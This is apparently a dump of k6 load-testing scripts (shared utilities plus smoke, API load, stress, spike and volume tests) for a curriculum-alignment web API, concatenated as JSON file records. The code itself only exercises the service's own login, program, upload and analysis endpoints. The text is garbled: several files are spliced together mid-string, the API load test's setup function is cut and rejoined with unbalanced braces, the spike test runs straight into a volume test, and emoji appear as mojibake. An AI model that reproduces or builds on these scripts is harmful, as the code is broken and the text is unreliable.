{
  "file_path": "/Users/q284340/Agentic/curriculum-alignment/tests/load/k6-scripts/utils.js",
  "content": "// k6 Load Testing Utilities\n// Shared utility functions for all load tests\n\nimport http from 'k6/http';\nimport { check, sleep } from 'k6';\nimport { Rate, Trend, Counter } from 'k6/metrics';\nimport { config, getAuthHeaders, isTokenValid, generateTestData } from './config.js';\n\n// Custom metrics\nexport const errorRate = new Rate('errors');\nexport const responseTime = new Trend('response_time');\nexport const requestCount = new Counter('requests');\nexport const authFailures = new Counter('auth_failures');\nexport const uploadSuccesses = new Counter('upload_successes');\nexport const analysisStarts = new Counter('analysis_starts');\n\n// Authentication utilities\nexport function authenticate() {\n  const payload = {\n    email: config.auth.email,\n    password: config.auth.password\n  };\n  \n  const response = http.post(\n    `${config.baseUrl}/auth/login`,\n    JSON.stringify(payload),\n    {\n      headers: config.requestOptions.headers,\n      tags: { name: 'auth' }\n    }\n  );\n  \n  const success = check(response, {\n    'login successful': (r) => r.status === 200,\n    'login response has token': (r) => {\n      try {\n        const body = JSON.parse(r.body);\n        return body.accessToken && body.accessToken.length > 0;\n      } catch {\n        return false;\n      }\n    }\n  });\n  \n  if (success) {\n    try {\n      const body = JSON.parse(response.body);\n      config.tokens.accessToken = body.accessToken;\n      config.tokens.refreshToken = body.refreshToken;\n      config.tokens.expiresAt = Date.now() + (body.expiresIn * 1000);\n    } catch (error) {\n      console.error('Failed to parse login response:', error);\n      authFailures.add(1);\n    }\n  } else {\n    authFailures.add(1);\n    console.error('Authentication failed:', response.status, response.body);\n  }\n  \n  return success;\n}\n\nexport function refreshToken() {\n  if (!config.tokens.refreshToken) {\n    return authenticate();\n  }\n  \n  const payload = {\n    refreshToken: config.tokens.refreshToken\n  };\n  \n  const response = http.post(\n    `${config.baseUrl}/auth/refresh`,\n    JSON.stringify(payload),\n    {\n      headers: config.requestOptions.headers,\n      tags: { name: 'auth_refresh' }\n    }\n  );\n  \n  const success = check(response, {\n    'refresh successful': (r) => r.status === 200\n  });\n  \n  if (success) {\n    try {\n      const body = JSON.parse(response.body);\n      config.tokens.accessToken = body.accessToken;\n      config.tokens.expiresAt = Date.now() + (body.expiresIn * 1000);\n    } catch (error) {\n      console.error('Failed to parse refresh response:', error);\n    }\n  }\n  \n  return success;\n}\n\nexport function ensureAuthenticated() {\n  if (!isTokenValid()) {\n    if (config.tokens.refreshToken) {\n      if (!refreshToken()) {\n        return authenticate();\n      }\n    } else {\n      return authenticate();\n    }\n  }\n  return true;\n}\n\n// HTTP request utilities\nexport function makeAuthenticatedRequest(method, url, body = null, options = {}) {\n  if (!ensureAuthenticated()) {\n    errorRate.add(1);\n    return null;\n  }\n  \n  const requestOptions = {\n    headers: getAuthHeaders(),\n    ...options\n  };\n  \n  let response;\n  \n  switch (method.toUpperCase()) {\n    case 'GET':\n      response = http.get(url, requestOptions);\n      break;\n    case 'POST':\n      response = http.post(url, body, requestOptions);\n      break;\n    case 'PUT':\n      response = http.put(url, body, requestOptions);\n      break;\n    case 'DELETE':\n      response = http.del(url, requestOptions);\n      break;\n    default:\n      throw new Error(`Unsupported HTTP method: ${method}`);\n  }\n  \n  // Record metrics\n  requestCount.add(1);\n  responseTime.add(response.timings.duration);\n  \n  if (response.status >= 400) {\n    errorRate.add(1);\n  }\n  \n  return response;\n}\n\n// Health check utility\nexport function healthCheck() {\n  const response = http.get(`${config.baseUrl}/health`, {\n    tags: { name: 'health' }\n  });\n  \n  return check(response, {\n    'health check status is 200': (r) => r.status === 200,\n    'health check response time < 1s': (r) => r.timings.duration < 1000,\n    'health check body contains status': (r) => {\n      try {\n        const body = JSON.parse(r.body);\n        return body.status === 'healthy';\n      } catch {\n        return false;\n      }\n    }\n  });\n}\n\n// Program management utilities\nexport function createProgram() {\n  const testData = generateTestData();\n  \n  const response = makeAuthenticatedRequest(\n    'POST',\n    `${config.baseUrl}/programs`,\n    JSON.stringify(testData.program),\n    { tags: { name: 'programs_create' } }\n  );\n  \n  if (response) {\n    const success = check(response, {\n      'program creation successful': (r) => r.status === 201,\n      'program response has ID': (r) => {\n        try {\n          const body = JSON.parse(r.body);\n          return body.id && body.id.length > 0;\n        } catch {\n          return false;\n        }\n      }\n    });\n    \n    if (success) {\n      try {\n        const body = JSON.parse(response.body);\n        return body.id;\n      } catch {\n        return null;\n      }\n    }\n  }\n  \n  return null;\n}\n\nexport function getPrograms() {\n  const response = makeAuthenticatedRequest(\n    'GET',\n    `${config.baseUrl}/programs`,\n    null,\n    { tags: { name: 'programs_list' } }\n  );\n  \n  if (response) {\n    return check(response, {\n      'programs list successful': (r) => r.status === 200,\n      'programs list has data': (r) => {\n        try {\n          const body = JSON.parse(r.body);\n          return Array.isArray(body.programs);\n        } catch {\n          return false;\n        }\n      }\n    });\n  }\n  \n  return false;\n}\n\nexport function getProgram(programId) {\n  const response = makeAuthenticatedRequest(\n    'GET',\n    `${config.baseUrl}/programs/${programId}`,\n    null,\n    { tags: { name: 'programs_get' } }\n  );\n  \n  if (response) {\n    return check(response, {\n      'program get successful': (r) => r.status === 200,\n      'program response has data': (r) => {\n        try {\n          const body = JSON.parse(r.body);\n          return body.id === programId;\n        } catch {\n          return false;\n        }\n      }\n    });\n  }\n  \n  return false;\n}\n\n// Document upload utilities\nexport function uploadDocument() {\n  const testData = generateTestData();\n  \n  const response = makeAuthenticatedRequest(\n    'POST',\n    `${config.baseUrl}/documents/upload`,\n    JSON.stringify(testData.document),\n    { tags: { name: 'document_upload' } }\n  );\n  \n  if (response) {\n    const success = check(response, {\n      'document upload successful': (r) => r.status === 201,\n      'document response has ID': (r) => {\n        try {\n          const body = JSON.parse(r.body);\n          return body.id && body.id.length > 0;\n        } catch {\n          return false;\n        }\n      }\n    });\n    \n    if (success) {\n      uploadSuccesses.add(1);\n      try {\n        const body = JSON.parse(response.body);\n        return body.id;\n      } catch {\n        return null;\n      }\n    }\n  }\n  \n  return null;\n}\n\n// Analysis workflow utilities\nexport function startAnalysis() {\n  const testData = generateTestData();\n  \n  const response = makeAuthenticatedRequest(\n    'POST',\n    `${config.baseUrl}/analysis/start`,\n    JSON.stringify(testData.analysis),\n    { tags: { name: 'analysis_start' } }\n  );\n  \n  if (response) {\n    const success = check(response, {\n      'analysis start successful': (r) => r.status === 202,\n      'analysis response has ID': (r) => {\n        try {\n          const body = JSON.parse(r.body);\n          return body.id && body.id.length > 0;\n        } catch {\n          return false;\n        }\n      }\n    });\n    \n    if (success) {\n      analysisStarts.add(1);\n      try {\n        const body = JSON.parse(response.body);\n        return body.id;\n      } catch {\n        return null;\n      }\n    }\n  }\n  \n  return null;\n}\n\nexport function getAnalysisStatus(analysisId) {\n  const response = makeAuthenticatedRequest(\n    'GET',\n    `${config.baseUrl}/analysis/${analysisId}`,\n    null,\n    { tags: { name: 'analysis_status' } }\n  );\n  \n  if (response) {\n    const success = check(response, {\n      'analysis status successful': (r) => r.status === 200,\n      'analysis status has data': (r) => {\n        try {\n          const body = JSON.parse(r.body);\n          return body.id === analysisId && body.status;\n        } catch {\n          return false;\n        }\n      }\n    });\n    \n    if (success) {\n      try {\n        const body = JSON.parse(response.body);\n        return body.status;\n      } catch {\n        return null;\n      }\n    }\n  }\n  \n  return null;\n}\n\n// Load testing patterns\nexport function userWorkflow() {\n  // Simulate realistic user workflow\n  \n  // 1. Health check\n  healthCheck();\n  sleep(1);\n  \n  // 2. Authentication\n  if (!ensureAuthenticated()) {\n    return;\n  }\n  sleep(1);\n  \n  // 3. Browse programs (80% of users)\n  if (Math.random() < 0.8) {\n    getPrograms();\n    sleep(2);\n    \n    // View specific program (50% of browsers)\n    if (Math.random() < 0.5) {\n      getProgram(config.testData.programId);\n      sleep(3);\n    }\n  }\n  \n  // 4. Upload document (20% of users)\n  if (Math.random() < 0.2) {\n    uploadDocument();\n    sleep(5);\n  }\n  \n  // 5. Start analysis (10% of users)\n  if (Math.random() < 0.1) {\n    const analysisId = startAnalysis();\n    if (analysisId) {\n      sleep(2);\n      // Check status once\n      getAnalysisStatus(analysisId);\n    }\n  }\n  \n  // Random think time\n  sleep(Math.random() * 5 + 1);\n}\n\nexport function adminWorkflow() {\n  // Simulate admin user workflow with more operations\n  \n  if (!ensureAuthenticated()) {\n    return;\n  }\n  \n  // Create new program\n  const programId = createProgram();\n  sleep(2);\n  \n  if (programId) {\n    // View created program\n    getProgram(programId);\n    sleep(1);\n    \n    // Upload document for program\n    uploadDocument();\n    sleep(3);\n    \n    // Start analysis\n    const analysisId = startAnalysis();\n    if (analysisId) {\n      sleep(5);\n      getAnalysisStatus(analysisId);\n    }\n  }\n  \n  sleep(Math.random() * 3 + 1);\n}\n\n// Utility for graceful degradation\nexport function handleError(response, operation) {\n  if (!response) {\n    console.error(`${operation}: No response received`);\n    return false;\n  }\n  \n  if (response.status >= 500) {\n    console.error(`${operation}: Server error ${response.status}`);\n    errorRate.add(1);\n    return false;\n  }\n  \n  if (response.status === 429) {\n    console.warn(`${operation}: Rate limited, backing off`);\n    sleep(Math.random() * 5 + 5); // Wait 5-10 seconds\n    return false;\n  }\n  \n  if (response.status >= 400) {\n    console.warn(`${operation}: Client error ${response.status}`);\n    errorRate.add(1);\n    return false;\n  }\n  \n  return true;\n}"
}

  "content": "// k6 Smoke Test\n// Basic functionality test with minimal load to verify system is working\n\nimport { check, group, sleep } from 'k6';\nimport { config } from './config.js';\nimport { \n  authenticate, \n  healthCheck, \n  getPrograms, \n  getProgram,\n  errorRate,\n  responseTime,\n  requestCount\n} from './utils.js';\n\nexport let options = {\n  stages: config.stages.smoke,\n  thresholds: {\n    ...config.thresholds,\n    // Stricter thresholds for smoke tests\n    'http_req_duration': ['p(95)<1000', 'p(99)<3000'],\n    'http_req_failed': ['rate<0.01'], // Less than 1% error rate\n    'checks': ['rate>0.95'] // 95% of checks should pass\n  },\n  tags: {\n    testType: 'smoke',\n    environment: __ENV.ENVIRONMENT || 'test'\n  }\n};\n\nexport default function() {\n  group('Smoke Test -   "content": "// k6 API Load Test\n// Comprehensive load test for all API endpoints\n\nimport { check, group, sleep } from 'k6';\nimport { config } from './config.js';\nimport { \n  authenticate,\n  healthCheck,\n  getPrograms,\n  getProgram,\n  createProgram,\n  uploadDocument,\n  startAnalysis,\n  getAnalysisStatus,\n  userWorkflow,\n  adminWorkflow,\n  errorRate,\n  responseTime,\n  requestCount,\n  uploadSuccesses,\n  analysisStarts\n} from './utils.js';\n\nexport let options = {\n  stages: config.stages.load,\n  thresholds: config.thresholds,\n  scenarios: {\n    // Regular user workflow - 20% of traffic  \n    admin_workflow: {\n      executor: 'ramping-vus',\n      stages: [\n        { duration: '5m', target: 2 },\n        { duration: '10m', target: 10 },\n        { duration: '5m', target: 2 },\n        { duration: '2m', target: 0 }\n      ],\n      gracefulRampDown: '30s',\n      exec: 'adminScenario'\n    },\n    \n    // API stress testing - 10% of traffic\n    api_stress: {\n      executor: 'constant-arrival-rate',\n      rate: 10,\n      timeUnit: '1s',\n      duration: '15m',\n      preAllocatedVUs: 20,\n      maxVUs: 50,\n      exec: 'apiStressScenario'\n    }\n  },\n  tags: {\n    testType: 'load',\n    environment: __ENV.ENVIRONMENT || 'test'\n  }\n};\n\n// Regular user scenario\nexport function userScenario() {\n  userWorkflow();\n}\n\n// Admin user scenario\nexport function adminScenario() {\n  adminWorkflow();\n}\n\n// API stress scenario - rapid API calls\nexport function apiStressScenario() {\n  group('API Stress Test', function() {\n    \n    // Health check burst\n    if (Math.random() < 0.3) {\n      healthCheck();\n    }\n    \n    // Authentication check\n    if (Math.random() < 0.1) {\n      authenticate();\n    }\n    \n    // Programs API burst\n    if (Math.random() < 0.5) {\n      getPrograms();\n      \n      if (Math.random() < 0.3) {\n        getProgram(config.testData.programId);\n      }\n    }\n    \n    // Document operations\n    if (Math.random() < 0.2) {\n      uploadDocument();\n    }\n    \n    // Analysis operations\n    if (Math.random() < 0.1) {\n      const analysisId = startAnalysis();\n      if (analysisId) {\n        sleep(1);\n        getAnalysisStatus(analysisId);\n      }\n    }\n    \n    // Minimal sleep for stress testing\n    sleep(0.5);\n  });\n}\n\n// Default function for backward compatibility\nexport default function() {\n  userScenario();\n}\n\nexport function setup() {\n  console.log('üöÄ Starting API Load Test');\n  console.log(`Target: ${config.baseUrl}`);\n  console.log('Scenarios:');\n  console.log('  - aborting load test');\n  }\n  \n  // Warm up authentication\n  if (!authenticate()) {\n    throw new Error('Authentication failed - check credentials');\n  }\n  \n  return { \n    startTime: Date.now(),\n    healthOk: true,\n    authOk: true\n  };\n}\n\nexport function teardown(data) {\n  const duration = Math.round((Date.now() - data.startTime) / 1000);\n  \n  console.log('‚úÖ API Load Test Completed');\n  console.log('');\n  console.log('üìä Test Results:');\n  console.log(`Duration: ${duration} seconds`);\n  console.log(`Total Requests: ${requestCount.count || 0}`);\n  console.log(`Average Response Time: ${Math.round(responseTime.avg || 0)}ms`);\n  console.log(`95th Percentile: ${Math.round(responseTime.p95 || 0)}ms`);\n  console.log(`99th Percentile: ${Math.round(responseTime.p99 || 0)}ms`);\n  console.log(`Error Rate: ${Math.round((errorRate.rate || 0) * 10000) / 100}%`);\n  console.log('');\n  console.log('üìà Business Metrics:');\n  console.log(`Successful Uploads: ${uploadSuccesses.count || 0}`);\n  console.log(`Analysis Started: ${analysisStarts.count || 0}`);\n  console.log('');\n  \n  // Performance assessment\n  const avgResponseTime = responseTime.avg || 0;\n  const errorRatePercent = (errorRate.rate || 0) * 100;\n  \n  if (errorRatePercent > 5) {\n    console.log('‚ùå FAIL: Error rate above 5%');\n  } else if (errorRatePercent > 1) {\n    console.log('‚ö†Ô∏è  WARN: Error rate above 1%');\n  } else {\n    console.log('‚úÖ PASS: Error rate within acceptable limits');\n  }\n  \n  if (avgResponseTime > 3000) {\n    console.log('‚ùå FAIL: Average response time above 3s');\n  } else if (avgResponseTime > 2000) {\n    console.log('‚ö†Ô∏è  WARN: Average response time above 2s');\n  } else {\n    console.log('‚úÖ PASS: Response times within acceptable limits');\n  }\n  \n  // Load test specific checks\n  const requestsPerSecond = (requestCount.count || 0) / duration;\n  console.log(`Throughput: ${Math.round(requestsPerSecond * 100) / 100} requests/second`);\n  \n  if (requestsPerSecond < 10) {\n    console.log('‚ö†Ô∏è  WARN: Low throughput - system may be constrained');\n  }\n}"
}

stress testing\n    'http_req_duration': ['p(95)<10000', 'p(99)<30000'], // Allow longer response times\n    'http_req_failed': ['rate<0.20'], // Allow up to 20% error rate under stress\n    'checks': ['rate>0.70'], // 70% of checks should pass\n    \n    // Specific endpoint thresholds under stress\n    'http_req_duration{name:health}': ['p(95)<2000'],\n    'http_req_duration{name:auth}': environment: __ENV.ENVIRONMENT || 'test'\n  }\n};\n\nexport default function() {\n  group('Stress Test - System Under Pressure', function() {\n    \n    // More aggressive operations for stress testing\n    const scenario = Math.random();\n    \n    if (scenario < 0.4) {\n      // Heavy read operations (40%)\n      heavyReadScenario();\n    } else if (scenario < 0.7) {\n      // Mixed operations (30%)\n      mixedOperationsScenario();\n    } else if (scenario < 0.9) {\n      // Heavy write operations (20%)\n      heavyWriteScenario();\n    } else {\n      // Analysis stress (10%)\n      analysisStressScenario();\n    }\n  });\n}\n\nfunction heavyReadScenario() {\n  group('Heavy Read Operations', function() {\n    if (!authenticate()) return;\n    \n    // Burst of read operations\n    for (let i = 0; i < 5; i++) {\n      getPrograms();\n      \n      if (i % 2 === 0) {\n        getProgram(config.testData.programId);\n      }\n      \n      // Short sleep between requests\n      sleep(0.2);\n    }\n    \n    sleep(1);\n  });\n}\n\nfunction mixedOperationsScenario() {\n  group('Mixed Operations', function() {\n    if (!authenticate()) return;\n    \n    // Rapid sequence of different operations\n    getPrograms();\n    sleep(0.5);\n    \n    const programId = createProgram();\n    sleep(1);\n    \n    if (programId) {\n      getProgram(programId);\n      sleep(0.5);\n    }\n    \n    uploadDocument();\n    sleep(2);\n    \n    const analysisId = startAnalysis();\n    if (analysisId) {\n      sleep(1);\n      getAnalysisStatus(analysisId);\n    }\n    \n    sleep(1);\n  });\n}\n\nfunction heavyWriteScenario() {\n  group('Heavy Write Operations', function() {\n    if (!authenticate()) return;\n    \n    // Multiple program creations\n    for (let i = 0; i < 3; i++) {\n      const programId = createProgram();\n      sleep(0.5);\n      \n      if (programId) {\n        // Upload document for each program\n        uploadDocument();\n        sleep(1);\n      }\n    }\n    \n    sleep(2);\n  });\n}\n\nfunction analysisStressScenario() {\n  group('Analysis Stress Operations', function() {\n    if (!authenticate()) return;\n    \n    // Start multiple analyses rapidly\n    const analysisIds = [];\n    \n    for (let i = 0; i < 2; i++) {\n      const analysisId = startAnalysis();\n      if (analysisId) {\n        analysisIds.push(analysisId);\n      }\n      sleep(0.5);\n    }\n    \n    // Check status of all analyses\n    analysisIds.forEach(id => {\n      getAnalysisStatus(id);\n      sleep(0.3);\n    });\n    \n    sleep(3);\n  });\n}\n\n// Stress-specific utility functions\nfunction stressTestEndpoint(endpoint, expectedStatus = 200) {\n  const response = makeAuthenticatedRequest('GET', `${config.baseUrl}${endpoint}`);\n  \n  if (response) {\n    const success = check(response, {\n      [`${endpoint} responded`]: (r) => r.status !== 0,\n      [`${endpoint} not server error`]: (r) => r.status < 500\n    });\n    \n    return handleError(response, `Stress test ${endpoint}`);\n  }\n  \n  return false;\n}\n\nexport function setup() {\n  console.log('üî• Starting Stress Test');\n  console.log(`Target: ${config.baseUrl}`);\n  console.log('Objective: Test system behavior under extreme load');\n  console.log('Warning: This test will push the system beyond normal capacity');\n  console.log('');\n  \n  // Verify system baseline\n  const healthOk = healthCheck();\n  if (!healthOk) {\n    throw new Error('System health check failed - aborting stress test');\n  }\n  \n  const authOk = authenticate();\n  if (!authOk) {\n    throw new Error('Authentication failed - check credentials');\n  }\n  \n  console.log('‚úÖ Baseline checks passed - beginning stress test');\n  \n  return { \n    startTime: Date.now(),\n    baselineHealthy: true\n  };\n}\n\nexport function teardown(data) {\n  const duration = Math.round((Date.now() - data.startTime) / 1000);\n  \n  console.log('üî• Stress Test Completed');\n  console.log('');\n  console.log('üìä Stress Test Results:');\n  console.log(`Duration: ${duration} seconds`);\n  console.log(`Total Requests: ${requestCount.count || 0}`);\n  console.log(`Average Response Time: ${Math.round(responseTime.avg || 0)}ms`);\n  console.log(`95th Percentile: ${Math.round(responseTime.p95 || 0)}ms`);\n  console.log(`99th Percentile: ${Math.round(responseTime.p99 || 0)}ms`);\n  console.log(`Max Response Time: ${Math.round(responseTime.max || 0)}ms`);\n  console.log(`Error Rate: ${Math.round((errorRate.rate || 0) * 10000) / 100}%`);\n  console.log('');\n  \n  // Stress test analysis\n  const avgResponseTime = responseTime.avg || 0;\n  const maxResponseTime = responseTime.max || 0;\n  const errorRatePercent = (errorRate.rate || 0) * 100;\n  const requestsPerSecond = (requestCount.count || 0) / duration;\n  \n  console.log('üîç Stress Test Analysis:');\n  console.log(`Peak Throughput: ${Math.round(requestsPerSecond * 100) / 100} requests/second`);\n  console.log(`System Degradation: ${maxResponseTime > avgResponseTime * 3 ? 'Significant' : 'Acceptable'}`);\n  console.log(`Recovery Capability: ${errorRatePercent < 10 ? 'Good' : 'Poor'}`);\n  console.log('');\n  \n  // System resilience assessment\n  if (errorRatePercent < 10) {\n    console.log('‚úÖ EXCELLENT: System maintained low error rate under stress');\n  } else if (errorRatePercent < 20) {\n    console.log('‚ö†Ô∏è  GOOD: System handled stress with acceptable error rate');\n  } else if (errorRatePercent < 50) {\n    console.log('‚ö†Ô∏è  POOR: High error rate indicates system struggling');\n  } else {\n    console.log('‚ùå CRITICAL: System failed under stress - investigate capacity');\n  }\n  \n  if (maxResponseTime < 30000) {\n    console.log('‚úÖ GOOD: Response times remained reasonable under stress');\n  } else {\n    console.log('‚ùå POOR: Response times exceeded acceptable limits');\n  }\n  \n  // Post-stress health check\n  console.log('');\n  console.log('üè• Post-Stress System Health Check...');\n  \n  sleep(5); // Allow system to stabilize\n  \n  const postHealthOk = healthCheck();\n  if (postHealthOk) {\n    console.log('‚úÖ System recovered successfully after stress test');\n  } else {\n    console.log('‚ùå System showing signs of instability after stress test');\n  }\n  \n  console.log('');\n  console.log('üí° Recommendations:');\n  \n  if (errorRatePercent > 15) {\n    console.log('- Consider increasing server capacity or implementing auto-scaling');\n  }\n  \n  if (maxResponseTime > 20000) {\n    console.log('- Review database query performance and add caching layers');\n  }\n  \n  if (requestsPerSecond < 20) {\n    console.log('- Investigate bottlenecks in request processing pipeline');\n  }\n  \n  if (!postHealthOk) {\n    console.log('- URGENT: System instability detected - immediate investigation required');\n  }\n}"
}

{
  "file_path": "/Users/q284340/Agentic/curriculum-alignment/tests/load/k6-scripts/spike-test.js",
  "content": "// k6 Spike Test\n// Tests system behavior under sudden load spikes\n\nimport { check, group, sleep } from 'k6';\nimport { config } from './config.js';\nimport { \n  authenticate,\n  healthCheck,\n  getPrograms,\n  getProgram,\n  createProgram,\n  uploadDocument,\n  startAnalysis,\n  getAnalysisStatus,\n  userWorkflow,\n  errorRate,\n  responseTime,\n  requestCount,\n  uploadSuccesses,\n  analysisStarts\n} from './utils.js';\n\nexport let options = {\n  stages: config.stages.spike,\n  thresholds: {\n    // Spike test thresholds - focus on recovery\n    'http_req_duration': ['p(95)<15000', 'p(99)<45000'],\n    'http_req_failed': ['rate<0.30'], // Allow higher error rate during spikes\n    'checks': ['rate>0.60'], // 60% of checks should pass\n    \n    // Recovery thresholds - system should recover quickly\n    'http_req_duration{name:health}': ['p(95)<5000'],\n    'http_req_failed{expected_response:true}': ['rate<0.50']\n  },\n  tags: {\n    testType: 'spike',\n    environment: __ENV.ENVIRONMENT || 'test'\n  }\n};\n\nlet currentStage = 'normal';\nlet spikeStartTime = 0;\nlet spikeDuration = 0;\n\nexport default function() {\n  // Determine current load stage based on VU count\n  const currentVUs = __VU;\n  const totalVUs = __ENV.K6_VUS || 100;\n  \n  if (currentVUs > totalVUs * 0.8) {\n    if (currentStage !== 'spike') {\n      currentStage = 'spike';\n      spikeStartTime = Date.now();\n      console.log(`üåã SPIKE DETECTED: ${currentVUs} VUs active`);\n    }\n  } else if (currentStage === 'spike') {\n    spikeDuration = Date.now() - spikeStartTime;\n    currentStage = 'recovery';\n    console.log(`üìâ SPIKE ENDED: Duration ${Math.round(spikeDuration / 1000)}s`);\n  }\n  \n  group('Spike Test - Sudden Load Changes', function() {\n    \n    if (currentStage === 'normal') {\n      normalLoadBehavior();\n    } else if (currentStage === 'spike') {\n      spikeLoadBehavior();\n    } else {\n      recoveryBehavior();\n    }\n    \n  });\n}\n\nfunction normalLoadBehavior() {\n  group('Normal Load Phase', function() {\n    // Standard user workflow\n    userWorkflow();\n    \n    // Normal think time\n    sleep(Math.random() * 3 + 2);\n  });\n}\n\nfunction spikeLoadBehavior() {\n  group('Spike Load Phase', function() {\n    // Aggressive behavior during spike\n    if (!authenticate()) return;\n    \n    // Random burst of operations\n    const operations = Math.floor(Math.random() * 3) + 1;\n    \n    for (let i = 0; i < operations; i++) {\n      const operation = Math.random();\n      \n      if (operation < 0.4) {\n        // Read operations (most common during spikes)\n        getPrograms();\n        if (Math.random() < 0.5) {\n          getProgram(config.testData.programId);\n        }\n      } else if (operation < 0.7) {\n        // Write operations\n        const programId = createProgram();\n        if (programId && Math.random() < 0.3) {\n          uploadDocument();\n        }\n      } else {\n        // Analysis operations\n        const analysisId = startAnalysis();\n        if (analysisId) {\n          sleep(0.5);\n          getAnalysisStatus(analysisId);\n        }\n      }\n      \n      // Very short delays during spike\n      sleep(0.1);\n    }\n    \n    // Minimal think time during spike\n    sleep(0.5);\n  });\n}\n\nfunction recoveryBehavior() {\n  group('Recovery Phase', function() {\n    // Gentler behavior to allow system recovery\n    \n    // Health check to verify recovery\n    const healthOk = healthCheck();\n    \n    check(healthOk, {\n      'system recovering': (ok) => ok === true\n    });\n    \n    if (!healthOk) {\n      // System still struggling, be very gentle\n      sleep(5);\n      return;\n    }\n    \n    // Light operations during recovery\n    if (authenticate()) {\n      if (Math.random() < 0.5) {\n        getPrograms();\n        sleep(2);\n      }\n      \n      if (Math.random() < 0.2) {\n        getProgram(config.testData.programId);\n        sleep(1);\n      }\n    }\n    \n    // Longer think time during recovery\n    sleep(Math.random() * 5 + 3);\n  });\n}\n\nexport function setup() {\n  console.log('üåã Starting Spike Test');\n  console.log(`Target: ${config.baseUrl}`);\n  console.log('Objective: Test system behavior under sudden load spikes');\n  console.log('Pattern: Normal ‚Üí Spike ‚Üí Recovery ‚Üí Bigger Spike ‚Üí Recovery');\n  console.log('');\n  \n  // Baseline health check\n  const healthOk = healthCheck();\n  if (!healthOk) {\n    throw new Error('System health check failed - aborting spike test');\n  }\n  \n  const authOk = authenticate();\n  if (!authOk) {\n    throw new Error('Authentication failed - check credentials');\n  }\n  \n  console.log('‚úÖ Baseline established - monitoring for spikes');\n  \n  return { \n    startTime: Date.now(),\n    spikes: [],\n    recoveryTimes: []\n  };\n}\n\nexport function teardown(data) {\n  const duration = Math.round((Date.now() - data.startTime) / 1000);\n  \n  console.log('üåã Spike Test Completed');\n  console.log('');\n  console.log('üìä Spike Test Results:');\n  console.log(`Total Duration: ${duration} seconds`);\n  console.log(`Total Requests: ${requestCount.count || 0}`);\n  console.log(`Average Response Time: ${Math.round(responseTime.avg || 0)}ms`);\n  console.log(`95th Percentile: ${Math.round(responseTime.p95 || 0)}ms`);\n  console.log(`99th Percentile: ${Math.round(responseTime.p99 || 0)}ms`);\n  console.log(`Max Response Time: ${Math.round(responseTime.max || 0)}ms`);\n  console.log(`Error Rate: ${Math.round((errorRate.rate || 0) * 10000) / 100}%`);\n  console.log('');\n  \n  // Spike-specific analysis\n  const avgResponseTime = responseTime.avg || 0;\n  const maxResponseTime = responseTime.max || 0;\n  const errorRatePercent = (errorRate.rate || 0) * 100;\n  const requestsPerSecond = (requestCount.count || 0) / duration;\n  \n  console.log('‚ö° Spike Impact Analysis:');\n  console.log(`Peak Throughput: ${Math.round(requestsPerSecond * 100) / 100} requests/second`);\n  console.log(`Response Time Spike: ${Math.round((maxResponseTime / avgResponseTime) * 100) / 100}x normal`);\n  console.log(`System Elasticity: ${errorRatePercent < 20 ? 'Good' : 'Poor'}`);\n  console.log('');\n  \n  // Recovery assessment\n  console.log('üîÑ Recovery Assessment:');\n  \n  // Post-spike health check\n  sleep(3); // Brief stabilization period\n  const postHealthOk = healthCheck();\n  \n  if (postHealthOk) {\n    console.log('‚úÖ EXCELLENT: System recovered quickly from spikes');\n    \n    // Test system responsiveness after recovery\n    const recoveryStart = Date.now();\n    getPrograms();\n    const recoveryTime = Date.now() - recoveryStart;\n    \n    if (recoveryTime < 2000) {\n      console.log('‚úÖ EXCELLENT: System responsiveness focus on data handling capacity\n    'http_req_duration': ['p(95)<20000', 'p(99)<60000'],\n    'http_req_failed': ['rate<0.15'], // Allow 15% error rate for volume operations\n    'checks': ['rate>0.75'], // 75% of checks should pass\n    \n    // Data-intensive operation thresholds\n    'http_req_duration{name:document_upload}': ['p(95)<30000', 'p(99)<120000'],\n    'http_req_duration{name:bulk_analysis}': ['p(95)<180000'], // 3 minutes for bulk operations\n    'http_req_duration{name:program_create}': ['p(95)<10000', 'p(99)<30000']\n  },\n  tags: {\n    testType: 'volume',\n    environment: __ENV.ENVIRONMENT || 'test'\n  }\n};\n\nexport default function() {\n  group('Volume Test - High Data Load', function() {\n    \n    const scenario = Math.random();\n    \n    if (scenario < 0.3) {\n      // Bulk program creation (30%)\n      bulkProgramCreation();\n    } else if (scenario < 0.6) {\n      // Mass document upload (30%)\n      massDocumentUpload();\n    } else if (scenario < 0.8) {\n      // Bulk analysis operations (20%)\n      bulkAnalysisOperations();\n    } else {\n      // Data-intensive queries (20%)\n      dataIntensiveQueries();\n    }\n    \n  });\n}\n\nfunction bulkProgramCreation() {\n  group('Bulk Program Creation', function() {\n    \n    if (!authenticate()) return;\n    \n    // Create multiple programs in batch\n    const batchSize = Math.floor(Math.random() * 5) + 3; // 3-7 programs\n    const programIds = [];\n    \n    for (let i = 0; i < batchSize; i++) {\n      const testData = generateTestData();\n      testData.program.name = `Volume Test Program ${Date.now()}-${i}`;\n      testData.program.description = `Large volume test program with extensive curriculum data and multiple requirements. This program includes comprehensive course listings, detailed prerequisites, and complex degree requirements that test the system's ability to handle substantial data volumes during program creation operations.`;\n      \n      // Add large curriculum data\n      testData.program.courses = [];\n      for (let j = 0; j < 50; j++) {\n        testData.program.courses.push({\n          code: `CS${1000 + j}`,\n          title: `Computer Science Course ${j + 1}`,\n          credits: Math.floor(Math.random() * 4) + 1,\n          description: `Comprehensive course covering advanced topics in computer science. This course provides in-depth knowledge and practical experience in various aspects of the field, preparing students for complex challenges in their professional careers.`,\n          prerequisites: j > 0 ? [`CS${1000 + j - 1}`] : []\n        });\n      }\n      \n      const programId = createProgram();\n      if (programId) {\n        programIds.push(programId);\n      }\n      \n      sleep(2); // Allow processing time between creations\n    }\n    \n    check(programIds.length, {\n      'bulk program creation successful': (count) => count > 0,\n      'majority of programs created': (count) => count >= batchSize * 0.7\n    });\n    \n    sleep(5); // Allow system to process bulk data\n  });\n}\n\nfunction massDocumentUpload() {\n  group('Mass Document Upload', function() {\n    \n    if (!authenticate()) return;\n    \n    // Upload multiple documents rapidly\n    const uploadCount = Math.floor(Math.random() * 4) + 2; // 2-5 documents\n    let successfulUploads = 0;\n    \n    for (let i = 0; i < uploadCount; i++) {\n      const success = uploadDocument();\n      if (success) {\n        successfulUploads++;\n      }\n      \n      sleep(3); // Brief pause between uploads\n    }\n    \n    check(successfulUploads, {\n      'mass upload partially successful': (count) => count > 0,\n      'majority of uploads successful': (count) => count >= uploadCount * 0.6\n    });\n    \n    sleep(8); // Allow document processing time\n  });\n}\n\nfunction bulkAnalysisOperations() {\n  group('Bulk Analysis Operations', function() {\n    \n    if (!authenticate()) 